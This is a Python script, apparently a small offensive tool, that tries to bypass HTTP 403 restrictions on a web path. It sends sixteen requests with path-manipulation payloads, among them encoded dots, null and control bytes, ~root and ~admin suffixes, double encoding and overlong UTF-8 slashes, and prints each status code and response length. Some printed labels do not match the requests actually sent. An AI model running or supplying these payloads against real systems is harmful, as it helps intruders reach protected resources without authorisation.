import requests
import os
import sys
from colorama import Fore


banner='''
         (`-')                                
         (OO )_.->                            
  .----. (_| \_)--.  .---.   .----.   .----.  
 /  ..  \\  `.'  /  / .  |  /  ..  \ \_.-,  | 
|  /  \  .\    .') / /|  | |  /  \  .  |_  <  
'  \  /  '.'    \ / '-'  ||'  \  /  '.-. \  | 
 \  `'  //  .'.  \`---|  |' \  `'  / \ `-'  / 
  `---''`--'   '--'   `--'   `---''   `---''  
           
   Author @github.com/erenlancaster'''

print(Fore.GREEN+banner)

if len(sys.argv) != 3:
    print(f"{Fore.WHITE}Usage: python3 403.py https://example.com filewithexistingfolderpaths")
    sys.exit()
if sys.argv[1].endswith("/"):
    print(f"{Fore.WHITE}[?] Please provide the URL without the last slash")
    sys.exit()

url = sys.argv[1]
path = sys.argv[2] 

r1 = requests.get(url+"/"+path)
status_code = str(r1.status_code)
length = len(r1.content)
print(Fore.WHITE+url+"/"+path + " ---> " + status_code,length)
r2 = requests.get(url+"/%2e/"+path)
status_code = str(r2.status_code)
length = len(r2.content)
print(url+"/%2e/"+path + " ---> " + status_code,length)
r3 = requests.get(url+"/"+path+"/.")
status_code = str(r3.status_code)
length = len(r3.content)
print(url+"/"+path +"/." " ---> " + status_code,length)
r4 = requests.get(url+"/"+path+"//")
status_code = str(r4.status_code)
length = len(r4.content)
print(url+"/"+path +"//" " ---> " + status_code,length)
r5 = requests.get(url+"/"+path+"/./")
status_code = str(r5.status_code)
length = len(r5.content)
print(url+"/"+path +"/./" " ---> " + status_code,length)
r6 = requests.get(url+"/"+path+"%20")
status_code = str(r6.status_code)
length = len(r6.content)
print(url+"/"+path +"/%20" " ---> " + status_code,length)
r7 = requests.get(url+"/"+path+"%09")
status_code = str(r7.status_code)
length = len(r7.content)
print(url+"/"+path +"/%09" " ---> " + status_code,length)
r8 = requests.get(url+"/"+path+"..%00")
status_code = str(r8.status_code)
length = len(r8.content)
print(url+"/"+path +"/..%00" " ---> " + status_code,length)
r9 = requests.get(url+"/"+path+"..%01")
status_code = str(r9.status_code)
length = len(r9.content)
print(url+"/"+path +"/..%01" " ---> " + status_code,length)
r10 = requests.get(url+"/"+path+"..%0a")
status_code = str(r10.status_code)
length = len(r10.content)
print(url+"/"+path +"/..%0a" " ---> " + status_code,length)
r11 = requests.get(url+"/"+path+"..%0d")
status_code = str(r11.status_code)
length = len(r11.content)
print(url+"/"+path +"/..%0d" " ---> " + status_code,length)
r12 = requests.get(url+"/"+path+"~root")
status_code = str(r12.status_code)
length = len(r12.content)
print(url+"/"+path +"/~root" " ---> " + status_code,length)
r13 = requests.get(url+"/"+path+"~admin")
status_code = str(r13.status_code)
length = len(r13.content)
print(url+"/"+path +"/~admin" " ---> " + status_code,length)
r14 = requests.get(url+"/"+path+"%2e%2e/")
status_code = str(r14.status_code)
length = len(r14.content)
print(url+"/"+path +"/%2e%2e/" " ---> " + status_code,length)
r15 = requests.get(url+"/"+path+"/%252e%252e/")
status_code = str(r15.status_code)
length = len(r15.content)
print(url+"/"+path +"/%252e%252e/" " ---> " + status_code,length)
r16 = requests.get(url+"/"+path+"/%c0%af/")
status_code = str(r16.status_code)
length = len(r16.content)
print(url+"/"+path +"/%c0%af/" " ---> " + status_code,length)
#print(a1)
